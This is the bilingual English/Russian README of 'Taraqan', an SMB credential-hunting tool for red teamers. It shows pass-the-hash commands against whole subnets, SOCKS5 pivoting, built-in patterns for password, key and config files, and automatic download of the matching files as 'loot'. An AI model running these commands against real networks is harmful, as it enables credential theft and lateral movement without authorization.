# Taraqan

**SMB Credential & Secret Hunter**

Taraqan crawls Windows network shares and hunts for sensitive files - passwords, credentials, keys, and configs. Authenticates via Pass-the-Hash (NTLM) or password, traverses SMB shares across entire subnets, and automatically downloads findings. Built for penetration testers and red teamers.

---

**Taraqan** сканирует SMB-шары в Windows-сетях и ищет чувствительные файлы - пароли, учётные данные, ключи и конфигурации. Аутентификация через Pass-the-Hash (NTLM) или пароль, обход шар по всей подсети с автоматическим скачиванием находок. Создан для пентестеров и red team специалистов.

---

## Features / Возможности

| Feature | Description |
|---------|-------------|
| **Pass-the-Hash** | NTLM authentication using NT hash - no plaintext password needed |
| **Subnet Scanning** | Scan entire subnets via CIDR notation (e.g., `10.0.0.0/16`) |
| **Pattern Matching** | Find files by name patterns - wildcards, extensions, keywords |
| **Auto Download** | Automatically download matched files to local directory |
| **SOCKS5 Proxy** | Route traffic through SOCKS5 proxy (pivot host support) |
| **UTF-8 Conversion** | Auto-convert downloaded text files from Windows-1251/UTF-16 to UTF-8 |
| **Multi-threaded** | Parallel scanning of hosts and shares for maximum speed |
| **Built-in Patterns** | Pre-configured rules for common credential files |

## Installation / Установка

```bash
git clone https://github.com/but43r/Taraqan.git
cd Taraqan
go build -o taraqan -ldflags="-s -w" .
```

Cross-compile for Linux from Windows:
```powershell
$env:GOOS='linux'; $env:GOARCH='amd64'; go build -o taraqan -ldflags="-s -w" .
```

## Quick Start / Быстрый старт

### Basic scan with PTH / Базовое сканирование с PTH
```bash
./taraqan -t 192.168.1.0/24 -u admin -d CORP -H 31d6cfe0d16ae931b73c59d7e0c089c0
```

### Custom patterns + download / Свои паттерны + скачивание
```bash
./taraqan -t 10.1.0.0/16 -u admin -d DOMAIN -H aad3b435b51404eeaad3b435b51404ee \
  --patterns "*учетк*,*пароль*,*доступы*,*.kdbx,*passw*" \
  --download -v
```

### Through SOCKS5 proxy / Через SOCKS5 прокси
```bash
./taraqan -t 10.1.0.0/24 -u admin -d DOMAIN -H hash \
  --socks5 127.0.0.1:1080 --download -v
```

### Password auth + export / Пароль + экспорт результатов
```bash
./taraqan -t 10.0.0.10 -u admin -d DOMAIN -p "Password123" \
  -o results.json --format json
```

### Skip admin shares / Пропуск админ-шар
```bash
./taraqan -t 10.0.0.0/24 -u admin -H hash --skip-admin --download
```

## Options / Параметры

### Authentication / Аутентификация

| Flag | Default | Description / Описание |
|------|---------|------------------------|
| `-t, --target` | - | Target IP or CIDR / Цель (IP или CIDR) **(required)** |
| `-u, --username` | - | Username / Имя пользователя **(required)** |
| `-d, --domain` | `.` | Domain / Домен |
| `-H, --hash` | - | NT hash for PTH / NT хеш для PTH |
| `-p, --password` | - | Password / Пароль |

### Scanning / Сканирование

| Flag | Default | Description / Описание |
|------|---------|------------------------|
| `--patterns` | built-in | Pattern file or comma-separated list / Файл паттернов или список через запятую |
| `--threads` | 10 | Parallel host threads / Потоки для хостов |
| `--share-threads` | 3 | Parallel shares per host / Потоки на шару |
| `--share-timeout` | 2m | Timeout per share / Таймаут на шару |
| `--depth` | 5 | Max directory depth / Макс. глубина директорий |
| `--skip-admin` | off | Skip admin shares (ADMIN$, C$) / Пропускать админ-шары |

### Network / Сеть

| Flag | Default | Description / Описание |
|------|---------|------------------------|
| `--socks5` | - | SOCKS5 proxy (host:port or user:pass@host:port) |
| `--timeout` | 5s | Connection timeout / Таймаут подключения |

### Download / Скачивание

| Flag | Default | Description / Описание |
|------|---------|------------------------|
| `--download` | off | Download matched files / Скачивать найденные файлы |
| `--download-dir` | ./loot | Download directory / Папка для скачивания |
| `--max-size` | 10 | Max file size in MB / Макс. размер файла в МБ |

### Output / Вывод

| Flag | Default | Description / Описание |
|------|---------|------------------------|
| `-o, --output` | - | Output file path / Файл для экспорта |
| `--format` | json | Output format (json/csv) / Формат вывода |
| `-v, --verbose` | off | Verbose output / Подробный вывод |

## Patterns / Паттерны

### Built-in patterns / Встроенные паттерны

Taraqan includes default patterns for common sensitive files:

- **Credentials**: `*password*`, `*credential*`, `*secret*`
- **Key stores**: `*.kdbx`, `*.pfx`, `*.pem`, `id_rsa`, `*.ppk`
- **Configs**: `web.config`, `.env`, `appsettings.json`
- **Remote access**: `*.rdp`, `ultravnc.ini`
- **Russian keywords**: `*пароль*`, `*учетк*`, `*секрет*`, `*ключ*`

### Custom patterns / Свои паттерны

Inline:
```bash
--patterns "*password*,*.kdbx,*учетк*"
```

From file (one pattern per line, `#` for comments):
```bash
--patterns patterns.txt
```

## Encoding / Кодировка

Downloaded text files (`.txt`, `.ini`, `.config`, `.xml`, `.env`, `.json`) are automatically converted to UTF-8.

Supported source encodings / Поддерживаемые исходные кодировки:
- UTF-16 LE / BE (Windows Notepad)
- Windows-1251 (Cyrillic / Кириллица)
- UTF-8 with BOM

## Output Example / Пример вывода

```
  ████████╗ █████╗ ██████╗  █████╗  ██████╗  █████╗ ███╗   ██╗
  ╚══██╔══╝██╔══██╗██╔══██╗██╔══██╗██╔═══██╗██╔══██╗████╗  ██║
     ██║   ███████║██████╔╝███████║██║   ██║███████║██╔██╗ ██║
     ██║   ██╔══██║██╔══██╗██╔══██║██║▄▄ ██║██╔══██║██║╚██╗██║
     ██║   ██║  ██║██║  ██║██║  ██║╚██████╔╝██║  ██║██║ ╚████║
     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚══▀▀═╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
                  SMB Credential & Secret Hunter

[*] Target:        10.1.0.0/16 (65022 hosts)
[*] User:          DOMAIN\admin
[*] Auth:          PTH (NT Hash)
[*] Patterns:      4 rules
[*] Host threads:  10
[*] Share threads: 3
[*] Download:      ./loot (max 10MB)

[*] Starting scan...

[██████░░░░░░░░░░░░░░]  30.2% (19652/65022) | Accessible: 87 | Matches: 12
```

## Disclaimer / Отказ от ответственности

**EN**: This tool is intended for authorized penetration testing and security assessments only. Unauthorized access to computer systems is illegal. The authors assume no liability for misuse.

**RU**: Инструмент предназначен исключительно для авторизованного тестирования на проникновение и оценки безопасности. Несанкционированный доступ к компьютерным системам является незаконным. Авторы не несут ответственности за неправомерное использование.

## License

MIT
